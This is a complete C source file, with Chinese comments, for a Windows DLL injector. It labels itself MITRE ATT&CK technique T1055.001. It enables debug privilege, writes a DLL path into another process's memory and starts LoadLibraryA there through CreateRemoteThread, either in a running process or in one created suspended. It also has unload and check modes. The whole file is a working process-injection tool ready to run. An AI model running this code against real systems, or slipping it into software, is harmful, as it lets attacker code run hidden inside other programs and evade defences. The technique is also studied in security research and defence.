/**
 * ===================================================================
 * DLL Injection - CreateRemoteThread + LoadLibrary
 * ===================================================================
 *
 * 经典的 DLL 注入技术，适用于：
 * - 现有进程
 * - 新创建的进程
 *
 * 核心原理：
 * 1. 在目标进程分配内存
 * 2. 写入 DLL 路径字符串
 * 3. 创建远程线程执行 LoadLibrary
 * 4. LoadLibrary 加载 DLL 到目标进程
 *
 * MITRE ATT&CK: T1055.001 - Process Injection: Dynamic-link Library Injection
 *
 * 参考：
 * - https://github.com/hasherezade/dll_injector
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

#define INJECTION_TIMEOUT 10000  // 10 秒超时

/**
 * ===================================================================
 * 打开目标进程
 * ===================================================================
 */
HANDLE OpenTargetProcess(DWORD pid) {
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE |
        PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        FALSE,
        pid
    );

    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        if (err == ERROR_INVALID_PARAMETER) {
            printf("[-] 无法打开进程 [PID: %lu]，进程可能已不存在\n", pid);
        } else {
            printf("[-] 打开进程失败 [PID: %lu]，错误码: 0x%lX\n", pid, err);
        }
        return NULL;
    }

    return hProcess;
}

/**
 * ===================================================================
 * 检查架构兼容性
 * ===================================================================
 */
BOOL IsCompatible(HANDLE hProcess) {
    BOOL isTargetWow64 = FALSE;
    IsWow64Process(hProcess, &isTargetWow64);

    BOOL isInjectorWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &isInjectorWow64);

    if (isTargetWow64 != isInjectorWow64) {
        printf("[-] 架构不兼容: 目标进程=%s, 注入器=%s\n",
               isTargetWow64 ? "32位" : "64位",
               isInjectorWow64 ? "32位" : "64位");
        return FALSE;
    }

    return TRUE;
}

/**
 * ===================================================================
 * 在远程进程写入数据
 * ===================================================================
 */
LPVOID WriteToRemoteProcess(HANDLE hProcess, LPVOID buffer, SIZE_T size) {
    // 分配内存
    LPVOID remoteAddr = VirtualAllocEx(
        hProcess,
        NULL,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!remoteAddr) {
        printf("[-] 无法在远程进程分配内存，错误码: %lu\n", GetLastError());
        return NULL;
    }

    // 写入数据
    if (!WriteProcessMemory(hProcess, remoteAddr, buffer, size, NULL)) {
        printf("[-] 无法写入远程进程，错误码: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        return NULL;
    }

    return remoteAddr;
}

/**
 * ===================================================================
 * 使用 LoadLibrary 注入 DLL
 * ===================================================================
 */
BOOL InjectDLL(HANDLE hProcess, const char* dllPath) {
    if (!dllPath || strlen(dllPath) == 0) {
        printf("[-] DLL 路径为空\n");
        return FALSE;
    }

    printf("[*] DLL 路径: %s\n", dllPath);

    // 获取 LoadLibraryA 地址
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        printf("[-] 无法获取 kernel32.dll 句柄\n");
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pLoadLibraryA =
        (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");

    if (!pLoadLibraryA) {
        printf("[-] 无法获取 LoadLibraryA 地址\n");
        return FALSE;
    }

    printf("[+] LoadLibraryA 地址: 0x%p\n", pLoadLibraryA);

    // 计算 DLL 路径大小（包括 null 终止符）
    SIZE_T dllPathSize = strlen(dllPath) + 1;

    // 在远程进程写入 DLL 路径
    LPVOID remotePathAddr = WriteToRemoteProcess(hProcess, (LPVOID)dllPath, dllPathSize);
    if (!remotePathAddr) {
        return FALSE;
    }

    printf("[+] DLL 路径已写入远程进程: 0x%p\n", remotePathAddr);

    // 创建远程线程执行 LoadLibraryA
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        pLoadLibraryA,
        remotePathAddr,
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] 创建远程线程失败，错误码: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remotePathAddr, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] 远程线程已创建，等待执行...\n");

    // 等待线程完成
    DWORD waitResult = WaitForSingleObject(hThread, INJECTION_TIMEOUT);

    BOOL success = FALSE;
    if (waitResult == WAIT_OBJECT_0) {
        // 获取线程退出码（LoadLibrary 的返回值，即模块句柄）
        DWORD exitCode = 0;
        if (GetExitCodeThread(hThread, &exitCode)) {
            if (exitCode != 0) {
                printf("[+] DLL 加载成功，模块句柄: 0x%lX\n", exitCode);
                success = TRUE;
            } else {
                printf("[-] DLL 加载失败（LoadLibrary 返回 NULL）\n");
            }
        }
    } else if (waitResult == WAIT_TIMEOUT) {
        printf("[-] 注入超时\n");
    } else {
        printf("[-] 等待线程失败，错误码: %lu\n", GetLastError());
    }

    // 清理
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remotePathAddr, 0, MEM_RELEASE);

    return success;
}

/**
 * ===================================================================
 * 检查模块是否已加载
 * ===================================================================
 */
BOOL IsModuleLoaded(HANDLE hProcess, const char* moduleName) {
    HMODULE hMods[1024];
    DWORD cbNeeded;

    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        printf("[-] 无法枚举进程模块，错误码: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD moduleCount = cbNeeded / sizeof(HMODULE);

    // 提取模块名称（不含路径）
    const char* targetName = strrchr(moduleName, '\\');
    if (targetName) {
        targetName++; // 跳过 '\'
    } else {
        targetName = moduleName;
    }

    // 遍历模块查找匹配
    for (DWORD i = 0; i < moduleCount; i++) {
        char modName[MAX_PATH];
        if (GetModuleBaseNameA(hProcess, hMods[i], modName, sizeof(modName))) {
            if (_stricmp(modName, targetName) == 0) {
                return TRUE;
            }
        }
    }

    return FALSE;
}

/**
 * ===================================================================
 * 获取模块句柄
 * ===================================================================
 */
HMODULE GetRemoteModuleHandle(HANDLE hProcess, const char* moduleName) {
    HMODULE hMods[1024];
    DWORD cbNeeded;

    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        return NULL;
    }

    DWORD moduleCount = cbNeeded / sizeof(HMODULE);

    // 提取模块名称
    const char* targetName = strrchr(moduleName, '\\');
    if (targetName) {
        targetName++;
    } else {
        targetName = moduleName;
    }

    for (DWORD i = 0; i < moduleCount; i++) {
        char modName[MAX_PATH];
        if (GetModuleBaseNameA(hProcess, hMods[i], modName, sizeof(modName))) {
            if (_stricmp(modName, targetName) == 0) {
                return hMods[i];
            }
        }
    }

    return NULL;
}

/**
 * ===================================================================
 * 卸载 DLL
 * ===================================================================
 */
BOOL UnloadDLL(HANDLE hProcess, const char* dllPath) {
    // 获取模块句柄
    HMODULE hModule = GetRemoteModuleHandle(hProcess, dllPath);
    if (!hModule) {
        printf("[-] 在目标进程中未找到该 DLL\n");
        return FALSE;
    }

    printf("[*] 找到模块句柄: 0x%p\n", hModule);

    // 获取 FreeLibrary 地址
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pFreeLibrary =
        (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "FreeLibrary");

    if (!pFreeLibrary) {
        printf("[-] 无法获取 FreeLibrary 地址\n");
        return FALSE;
    }

    // 创建远程线程执行 FreeLibrary
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        pFreeLibrary,
        hModule,
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] 创建远程线程失败，错误码: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] 远程线程已创建，正在卸载 DLL...\n");

    // 等待完成
    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode = 0;
    BOOL success = FALSE;
    if (GetExitCodeThread(hThread, &exitCode)) {
        if (exitCode != 0) {
            printf("[+] DLL 卸载成功\n");
            success = TRUE;
        } else {
            printf("[-] DLL 卸载失败（FreeLibrary 返回 0）\n");
        }
    }

    CloseHandle(hThread);
    return success;
}

/**
 * ===================================================================
 * 提升进程权限（Debug Privilege）
 * ===================================================================
 */
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

/**
 * ===================================================================
 * 注入到现有进程
 * ===================================================================
 */
BOOL InjectIntoExistingProcess(DWORD pid, const char* dllPath) {
    printf("\n===================================================================\n");
    printf("DLL Injection - 注入到现有进程\n");
    printf("===================================================================\n\n");

    printf("[*] 目标 PID: %lu\n", pid);

    // 打开进程
    HANDLE hProcess = OpenTargetProcess(pid);
    if (!hProcess) {
        return FALSE;
    }

    // 检查架构兼容性
    if (!IsCompatible(hProcess)) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // 注入 DLL
    BOOL result = InjectDLL(hProcess, dllPath);

    // 验证注入结果
    if (result && IsModuleLoaded(hProcess, dllPath)) {
        printf("\n[+] 注入成功！DLL 已加载到目标进程\n");
    } else {
        printf("\n[-] 注入失败！\n");
        result = FALSE;
    }

    CloseHandle(hProcess);
    return result;
}

/**
 * ===================================================================
 * 注入到新进程
 * ===================================================================
 */
BOOL InjectIntoNewProcess(const char* exePath, const char* dllPath) {
    printf("\n===================================================================\n");
    printf("DLL Injection - 注入到新进程\n");
    printf("===================================================================\n\n");

    printf("[*] 目标程序: %s\n", exePath);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    // 创建挂起的进程
    if (!CreateProcessA(
        exePath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[-] 创建进程失败，错误码: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] 进程已创建 (PID: %lu)\n", pi.dwProcessId);

    // 注入 DLL
    BOOL result = InjectDLL(pi.hProcess, dllPath);

    // 验证注入结果
    if (result && IsModuleLoaded(pi.hProcess, dllPath)) {
        printf("\n[+] 注入成功！DLL 已加载到目标进程\n");
    } else {
        printf("\n[-] 注入失败！\n");
        result = FALSE;
    }

    // 恢复进程
    printf("[*] 恢复主线程...\n");
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return result;
}

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("===================================================================\n");
    printf("DLL Injection (CreateRemoteThread + LoadLibrary)\n");
    printf("Based on: hasherezade/dll_injector\n");
    printf("===================================================================\n\n");

    if (argc < 3) {
        printf("用法:\n");
        printf("  注入到现有进程: %s <PID> <DLL路径>\n", argv[0]);
        printf("  注入到新进程:   %s <EXE路径> <DLL路径>\n\n", argv[0]);
        printf("  卸载 DLL:       %s <PID> <DLL路径> --unload\n\n", argv[0]);
        printf("  检查 DLL:       %s <PID> <DLL路径> --check\n\n", argv[0]);
        printf("示例:\n");
        printf("  %s 1234 C:\\\\test.dll\n", argv[0]);
        printf("  %s \"C:\\\\Windows\\\\System32\\\\notepad.exe\" C:\\\\test.dll\n", argv[0]);
        printf("  %s 1234 C:\\\\test.dll --unload\n", argv[0]);
        return 1;
    }

    // 提升权限
    if (EnableDebugPrivilege()) {
        printf("[+] Debug 权限已获取\n\n");
    } else {
        printf("[!] 无法获取 Debug 权限，可能需要管理员权限\n\n");
    }

    const char* target = argv[1];
    const char* dllPath = argv[2];

    // 检查是否为卸载操作
    if (argc >= 4 && _stricmp(argv[3], "--unload") == 0) {
        DWORD pid = atoi(target);
        if (pid == 0) {
            printf("[-] 无效的 PID\n");
            return 1;
        }

        HANDLE hProcess = OpenTargetProcess(pid);
        if (!hProcess) {
            return 1;
        }

        BOOL result = UnloadDLL(hProcess, dllPath);
        CloseHandle(hProcess);
        return result ? 0 : 1;
    }

    // 检查是否为检查操作
    if (argc >= 4 && _stricmp(argv[3], "--check") == 0) {
        DWORD pid = atoi(target);
        if (pid == 0) {
            printf("[-] 无效的 PID\n");
            return 1;
        }

        HANDLE hProcess = OpenTargetProcess(pid);
        if (!hProcess) {
            return 1;
        }

        if (IsModuleLoaded(hProcess, dllPath)) {
            printf("[+] DLL 已加载在进程中\n");
        } else {
            printf("[-] DLL 未加载在进程中\n");
        }

        CloseHandle(hProcess);
        return 0;
    }

    // 判断是 PID 还是 EXE 路径
    DWORD pid = atoi(target);
    BOOL result;

    if (pid > 0) {
        // 注入到现有进程
        result = InjectIntoExistingProcess(pid, dllPath);
    } else {
        // 注入到新进程
        result = InjectIntoNewProcess(target, dllPath);
    }

    printf("\n===================================================================\n");
    if (result) {
        printf("[+] DLL Injection 完成！\n");
    } else {
        printf("[-] DLL Injection 失败！\n");
    }
    printf("===================================================================\n");

    printf("\n按回车键退出...\n");
    getchar();

    return result ? 0 : 1;
}
